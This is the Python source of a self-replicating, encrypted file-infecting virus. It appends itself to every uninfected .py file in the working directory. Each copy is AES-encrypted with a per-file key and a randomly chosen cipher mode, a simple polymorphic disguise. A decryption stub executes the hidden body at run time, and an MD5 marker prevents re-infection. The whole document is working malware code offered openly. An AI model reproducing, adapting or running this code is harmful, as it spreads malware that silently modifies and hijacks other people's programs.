import os
from Crypto.Cipher import AES
import hashlib
import random

#string of the decryption routine


decryption_routine = """import os
import hashlib
from Crypto.Cipher import AES
import tempfile
def {0}():
	current_file_name = os.path.basename(__file__)
	with open(current_file_name,'r+w') as this:
		lines = this.readlines()
		key = hashlib.md5(lines[0]).digest()
		iv = hashlib.md5(key).digest()
		cipher = AES.new(key, {1}, iv)		
		encrypted_body = lines[-1]
		body = cipher.decrypt(encrypted_body[1:-34].decode('hex'))
		tmp = tempfile.NamedTemporaryFile(mode='w',suffix='.py',delete=True)
		tmp.write(body)
		tmp.flush()
		execfile(tmp.name, {{ \"__file__\" : tmp.name}})
		tmp.close()
{0}()
"""
#over infection is avoided through a 
#nfection_code = hash(#evil_infected + name of the infected file)
#the infection_code is appended at the end of the infected file
def infected(infection_code, file_name):

	file_code = hashlib.md5('#evil_infected'+ file_name).digest().encode('hex')
	return  file_code == infection_code

#open the current file
#and store its text inside a variable
current_file_name = __file__
malware_code = ''
with open(current_file_name,'r+w') as this:
	malware_code = this.read()

#empty comments are appended at the end of the string
#because the text size must be a multiple of 16
malware_code = malware_code + (AES.block_size - (len(malware_code) % AES.block_size)) *'#'

#look for all the python files inside
#the current directory
py_files = [file_in_dir for file_in_dir in os.listdir('./') if file_in_dir.endswith('.py')]
for file_name in py_files:
	with open(file_name,'r+w') as target:
		target_code = target.readlines()
		#check for over infection
		#read the last 32 characters		
		if not infected(target_code[-1][-33:-1], file_name):
			
			#the hash of the first line of the 
			#target file is the encryption key
			key = hashlib.md5(target_code[0]).digest()
			iv = hashlib.md5(key).digest()
			
			#choose randomly an encryption mode
			mode = [AES.MODE_CBC, AES.MODE_ECB, AES.MODE_CFB][random.randint(0,2)]
			cipher = AES.new(key, mode, iv)

			encrypted_code = cipher.encrypt(malware_code).encode('hex')
			
			#the decryption routine name = iv
			decryption_routine = decryption_routine.format('a'+iv.encode('hex'),mode)
			
			#create infection_code
			infection_code = hashlib.md5('#evil_infected'+ file_name).digest().encode('hex')
			#append inside the target file:
			#################################
			# original body 				#
			# decryption routine			#
			# encrypted_body#infection_code #
			#################################
			target.write('\n'+decryption_routine+'\n#'+encrypted_code+'#'+infection_code+'\n')
print 'Malicious payload <_<'
#infection code
#f19482de09c116df9149db4cf55fb8b1
